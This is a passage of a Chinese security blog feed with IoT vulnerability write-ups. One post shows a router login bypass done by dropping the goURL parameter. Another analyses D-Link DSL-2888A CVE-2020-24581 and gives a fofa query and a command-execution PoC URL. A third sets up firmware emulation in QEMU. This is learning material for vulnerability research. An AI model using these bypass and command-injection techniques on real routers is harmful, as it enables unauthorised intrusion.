class="line">./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151842851.png" title="image-20230815184214754" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151842851.png" alt="image-20230815184214754"></a></p><p>会因为找不到文件而报错 </p><p>直接在对应目录下创建一个空文件就可以了</p><p>成功启动服务</p><h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>首先我们要清楚 我们要从哪个方向来分析这个路由器  这一点是至关重要的 不能漫无目的</p><p>我们选择针对登录这一点来分析 首先试着随便输入密码 并且通过抓包来查看登录检测涉及到了哪些文件</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848154.png" title="image-20230815184817104" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848154.png" alt="image-20230815184817104"></a></p><p>可以看到 密码的发送是通过这个包来进行的</p><p>同时你可以注意到状态是302 这意味着服务器返回了重定向响应 来看一下跳转的地址是什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848830.png" title="image-20230815184849802" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848830.png" alt="image-20230815184849802"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.6.1/formLoginAuth.htm？authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=1</span><br></pre></td></tr></table></figure><p>有着比较多的参数 应该是用来判断用户的密码是否正确 我们找到这个包对应的cgi文件</p><p>搜索username字符串 尝试找到对应的代码</p><p>发现了sub_42A2D0函数 其功能似乎是根据其他参数来决定重定向的网址 来看下面的代码</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151931810.png" title="image-20230815193100787" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151931810.png" alt="image-20230815193100787"></a></p><p>根据v9来判断重定向的网址 这里猜测应该是flag这个参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.6.1/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=ie8</span><br></pre></td></tr></table></figure><p>通过单独修改flag为ie8 最后成功重定向到了login_ie.html 证实了猜想 但是好像没有什么软用</p><p>接下来想的是为www目录下找到formLoginAuth.htm这个网址 但是好像没有 那么就去lighttpd这个文件来看看</p><p>可以看到 根据不同的网址来进入不同的函数 我们来跟进到form_login函数中</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151935557.png" title="image-20230815193537526" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151935557.png" alt="image-20230815193537526"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    fbss = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = time(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !ws_get_cookie(a1, <span class="string">&quot;SESSION_ID&quot;</span>, v16, <span class="number">0</span>) &amp;&amp; form_get_idx_by_sessionid(&amp;fl_sess, v13, v16) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v23, v20, v13);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(v15, <span class="string">&quot;%ld:%d&quot;</span>, v13, <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v19, <span class="string">&quot;%d:%s&quot;</span>, <span class="number">2</span>, v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( form_get_idx_by_sessionid(&amp;fl_sess, v13, v19) != <span class="number">-1</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      v6 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( form_add_session(&amp;fl_sess, &amp;fl_sess_bak, <span class="number">-1</span>, v17, v6, v19, <span class="number">2</span>, v13) )</span><br><span class="line">    &#123;</span><br><span class="line">      ws_set_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, v19, <span class="number">0</span>, <span class="string">&quot;/&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v23, v20, v13);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ws_clear_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    fbss = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v14, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v23, <span class="string">&quot;/login_ie.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(&amp;v14) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s%s&quot;</span>, v23, <span class="string">&quot;/phone&quot;</span>, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v23, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到对于v8的值进行了判断 如果不为0则进入if分支 可以看到对于a2进行了操作 </p><p>而我们看到下面 a2应该是重定向的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151948757.png" title="image-20230815194828730" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151948757.png" alt="image-20230815194828730"></a></p><p>那么v8的值怎么来的呢  可以看到应该是跟authcode的参数有关系 那么我们将authcode修改为1后试试</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151949150.png" title="image-20230815194901122" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151949150.png" alt="image-20230815194901122"></a></p><p>结果发现还是跳转回到login.html页面  但是参数确实多了个timestamp</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151950240.png" title="image-20230815195043221" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151950240.png" alt="image-20230815195043221"></a></p><p>这里应该是由于我们重定向导致的 但是将flag删除掉 也没有办法 因为会进入最后的else分支 默认重定向到&#x2F;login.html</p><p>但是我们仔细观察一下参数 还是有一个叫做goURL的 我们把这个参数删除掉后</p><p>成功绕过了登录 进入了后台</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151952062.png" title="image-20230815195258957" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151952062.png" alt="image-20230815195258957"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2020-24581</title>
    <link href="http://example.com/2023/08/09/CVE-2020-24581/"/>
    <id>http://example.com/2023/08/09/CVE-2020-24581/</id>
    <published>2023-08-09T11:51:32.000Z</published>
    <updated>2023-09-14T17:18:53.765Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参照资料<a href="https://www.anquanke.com/post/id/229323#h3-5">https://www.anquanke.com/post/id/229323#h3-5</a></p><p>比较简单的一个CVE 且不需要模拟路由器环境 适合第一次接触iot的萌新(就比如我</p><p>同时由于我的网络基础知识薄弱 有些地方也是网络上查资料的 可能存在错误</p><p><strong>漏洞路由器型号:D-Link DSL-2888A</strong></p><p><strong>漏洞编号: CVE-2020-24581</strong></p><p><strong>fofa搜索关键词: body&#x3D;DSL-2888A</strong></p><p><strong>漏洞影响版本:  AU_2.31_V1.1.47ae55之前的版本</strong></p><p><strong>固件下载: <a href="https://www.dlink.com.sg/dsl-2888a/">https://www.dlink.com.sg/dsl-2888a/</a></strong></p><h1 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h1><p>首先要清楚 漏洞产生的原因是因为execute_cmd.cgi文件存在任意的参数执行</p><p>为了捋清楚漏洞的本质 我们要定位到以下两个重点</p><p><strong>1.如何执行到execute_cmd.cgi文件</strong></p><p><strong>2.如何赋值execute_cmd.cgi的参数</strong></p><h2 id="如何执行到execute-cmd-cgi文件"><a href="#如何执行到execute-cmd-cgi文件" class="headerlink" title="如何执行到execute_cmd.cgi文件"></a>如何执行到execute_cmd.cgi文件</h2><p>&#x2F;etc&#x2F;rc.d&#x2F;rcS是Linux系统中负责系统初始化以及启动相关任务的脚本</p><p>本次漏洞是由web服务触发的 所以我们需要跟进到路由器负责web服务的二进制文件 通过&#x2F;etc&#x2F;rc.d&#x2F;rcS脚本 可以定位到是dhttpd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -e &quot;/usr/sbin/onetouch&quot; ]; then</span><br><span class="line">dxml -n dbros -t &amp;</span><br><span class="line">sleep 1</span><br><span class="line">dxmlc -l /usr/script/onetouch/dlink.xml</span><br><span class="line">sleep 1</span><br><span class="line">/usr/script/onetouch/sync_device.sh</span><br><span class="line">/usr/script/onetouch/sync_wan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan5g.sh</span><br><span class="line"></span><br><span class="line">dhttpd &amp;</span><br><span class="line">killall onetouch</span><br><span class="line">onetouch &amp;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>通过find命令 可以定位到位于&#x2F;usr&#x2F;sbin&#x2F;dhttpd目录<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" alt="image.png"></a><br>发现是32位的ARM架构的文件<br>随后我们需要定位到dhttp文件中负责调用execute_cmd.cgi文件的函数<br>先来搞明白cgi文件是什么 CGI (Common Gateway Interface) 文件是一种通用的网页编程技术 用于在Web服务器上执行可执行程序或脚本<br>其存放在jffs2-root&#x2F;www&#x2F;cgi-bin&#x2F;目录下<br>所以我们尝试在ida中搜索cgi-bin字符串 就可以跟着定位到sub_9C4C函数<br>该函数用来加载web和cgi组件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" alt="image.png"></a><br>我们可以进一步跟进到sub_BEA0函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" alt="image.png"></a><br>这里进行调用cgi文件前的相关check和初始化<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" alt="image.png"></a><br>在后面可以看到 需要相关的环境变量来启动cgi文件<br>可以看到有REMOTE_USER的变量 说明可能需要<br>随后调用了sub_BB5C函数执行cgi文件</p><h2 id="如何赋值execute-cmd-cgi的参数"><a href="#如何赋值execute-cmd-cgi的参数" class="headerlink" title="如何赋值execute_cmd.cgi的参数"></a>如何赋值execute_cmd.cgi的参数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">. /usr/syscfg/api_log.sh</span><br><span class="line">cmd=`echo $&#123;QUERY_STRING&#125; | cut -d = -f 3` </span><br><span class="line">cmd=`echo $&#123;cmd&#125; |tr &quot;%20&quot; &quot; &quot;` </span><br><span class="line">result=`$&#123;cmd&#125;`  </span><br><span class="line">TGP_Log $&#123;TGP_LOG_WARNING&#125; &quot;cmd=$&#123;cmd&#125;, result=$&#123;result&#125;&quot;</span><br><span class="line">echo  &quot;Content-type: text/html&quot;</span><br><span class="line">echo  &quot;&quot;</span><br><span class="line">echo -n $&#123;result&#125;</span><br></pre></td></tr></table></figure><p>通过分析其内容 可以看到cmd参数是根据QUERY_STRING环境变量的第三个字段来的 其分割符是‘&#x3D;’<br>那么我们此时来遍历一下目录下的所有文件 看看QUERY_STRING环境变量的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_files</span>(<span class="params">directory, target_string</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            filepath = os.path.join(root, file)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                line_number = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">if</span> target_string.lower() <span class="keyword">in</span> line.lower():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Found in file: <span class="subst">&#123;filepath&#125;</span>, line: <span class="subst">&#123;line_number&#125;</span>, content: <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">                    line_number += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要搜索的目录和目标字符串</span></span><br><span class="line">search_directory = <span class="string">&#x27;/home/chen/iot/_DSL-2888A_AU_2.12_V1.1.47Z1-Image-all.bin.extracted/jffs2-root&#x27;</span></span><br><span class="line">target_string = <span class="string">&#x27;QUERYSTRING&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行批量搜索</span></span><br><span class="line">search_files(search_directory, target_string)</span><br></pre></td></tr></table></figure><p>这里搜索QUERY_STRING没有找到有用的文件 所以去掉了_</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" title="image-20230809214437721" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" alt="image-20230809214437721"></a></p><p>于是我们可以定位到ajax.js文件</p><p>通过观察POC我们可以知道 是通过GET请求 很快可以定位到对应的代码</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">get <span class="punctuation">:</span> function(_dataType)</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        var _url = this.url;</span><br><span class="line">        if(_url.indexOf(&#x27;?&#x27;) == <span class="number">-1</span>)</span><br><span class="line">            _url += &#x27;?timestamp=&#x27; + new Date().getTime();</span><br><span class="line">        else</span><br><span class="line">            _url += <span class="string">&quot;&amp;timestamp=&quot;</span> + new Date().getTime();</span><br><span class="line">        if(this.queryString.length &gt; <span class="number">0</span>)</span><br><span class="line">            _url += <span class="string">&quot;&amp;&quot;</span> + this.queryString;</span><br><span class="line"></span><br><span class="line">        this.xmlHttp.open(<span class="string">&quot;GET&quot;</span><span class="punctuation">,</span> _url<span class="punctuation">,</span> <span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">        <span class="comment">/* will make IE11 fail.</span></span><br><span class="line"><span class="comment">        if(!document.all)&#123;</span></span><br><span class="line"><span class="comment">            if(_dataType == &quot;xml&quot;)</span></span><br><span class="line"><span class="comment">                this.xmlHttp.overrideMimeType(&quot;text/xml;charset=utf8&quot;);</span></span><br><span class="line"><span class="comment">            else</span></span><br><span class="line"><span class="comment">                this.xmlHttp.overrideMimeType(&quot;text/html;charset=gb2312&quot;);//设定以gb2312编码识别数据  </span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        this.xmlHttp.send(<span class="literal"><span class="keyword">null</span></span>);</span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>不难看出其会在url后加上一个参数timestamp 用来记录当前的时间戳 随后拼接完url后发送</p><p>我个人认为这一步分析其实没有什么必要 因为在审计完execute_cmd.cgi后我们就可以得到POC如何编写了</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>加上刚才分析的 cmd参数是由第三个字段来的 也就是第二个参数 那么可以直接得到POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx/cgi-bin/execute_cmd.cgi?aaaa=6&amp;bbbb=ls</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" title="image-20230809215418504" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" alt="image-20230809215418504"></a></p><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在dhttpd文件的分析中 可以看到要成功执行cgi文件还需要先进行登录验证</p><p>所以我们需要搭配上CVE-2020-24579才能成功复现该漏洞</p><p>这里就不进行讲解</p><p><a href="https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/">https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>华为532e漏洞复现</title>
    <link href="http://example.com/2023/08/09/%E5%8D%8E%E4%B8%BA532e%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2023/08/09/%E5%8D%8E%E4%B8%BA532e%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-08-09T00:01:57.000Z</published>
    <updated>2024-09-20T09:15:39.157Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="华为532e"><a href="#华为532e" class="headerlink" title="华为532e"></a>华为532e</h1><p>本次使用的固件是华为532e系列路由器<br>固件下载地址： <a href="https://github.com/CcccccccJun/cloud">https://github.com/CcccccccJun/cloud</a></p><p>首先使用binwalk来提取固件 这里要注意一下 如果binwalk没有提取到root文件夹 那么问题出在没有安装相应的文件系统<br>该固件需要安装的是sasquatch 配置好相关环境后可以成功提取到文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090859342.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090859342.png" alt="image.png"></a><br>随后我们将root目录打包成压缩文件 供等下上传到模拟系统中<br><code>tar -czvf 1.tar squashfs-root/</code><br>qemu模拟有多种形式 本次我们使用的是系统模拟 同时通过file观察任意的可执行文件 可以注意到该路由器使用的是MIPS架构<br>为此 我们需要准备MIPS的内核文件以及一个MIPS架构的虚拟机映像文件<br>可以在该网站上下载  <a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a><br>随后我们需要创建一个TUN&#x2F;TAP虚拟网络接口 其可以在操作系统和用户空间之间进行网络数据包的传输 便于我们在虚拟机中连接到启动后的路由器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tunctl -t top0 -u root</span><br><span class="line">ifconfig top0 192.168.10.1</span><br></pre></td></tr></table></figure><p>我们给予的top0接口的ipv4地址的子网号可以为任意 同时要使用默认网关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090936146.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090936146.png" alt="image.png"></a><br>随后我们利用qemu进行系统模拟<br><code>qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</code><br>为qemu模拟出来的虚拟机增加了一个TAP设备的虚拟网络接口top0用于通信<br>默认的登录账号和密码都是root<br>我们将eth0接口配置和刚才top0接口相同的c段<br><code>ifconfig eth0 192.169.10.2</code><br>随后就可以在ubuntu中访问到debian虚拟机<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090958896.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308090958896.png" alt="image.png"></a><br>随后我们利用scp把刚才打包好的压缩文件上传到debian虚拟机中<br><code>scp 1.tar root@192.168.10.2:/root/</code><br>但是这里报错了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091008147.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091008147.png" alt="image.png"></a><br>大概意思是debian虚拟机中的openssh禁用了ssh-dss算法<br>我们需要手动加上参数来允许</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.tar root@192.168.10.2:/root/</span><br></pre></td></tr></table></figure><p>随后回到debian虚拟机 利用<code>tar –zxvf 1.tar</code> 命令进行解压<br>接着我们需要将&#x2F;dev目录与squashfs-root目录进行绑定 使得可以访问到所需的设备文件<br>同理 将&#x2F;proc目录挂载到squashfs-root对应的目录下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>随后以squashfs-root目录为根目录 执行shell<br><code>chroot ./squashfs-root/ sh</code><br>由于在路由器启动后 eth0接口的ip地址会被更改 所以我们需要在启动路由器的过程中 重新配置eth0接口 这也就意味着我们需要连接两个会话<br>已有的会话是通过qemu模拟后直接生成的虚拟机 不会随着ip的更改而断开 而通过ssh连接的会话会因为ip受到影响<br>于是 我们需要在ssh的会话中启动路由器 随后这个ssh进程就会因为ip改变而卡住 然后我们再通过原本的会话重新配置eth0 就可以成功启动路由器的同时 保证我们的eth0还是原本的ip地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>启动路由器的环境</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091028108.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091028108.png" alt="image.png"></a><br>成功启动后 我们就可以在宿主机中访问到路由器了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091029879.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308091029879.png" alt="image.png"></a><br>这里使用360浏览器是因为其他浏览器不支持TLS1.0的协议 导致无法成功访问</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
</feed>
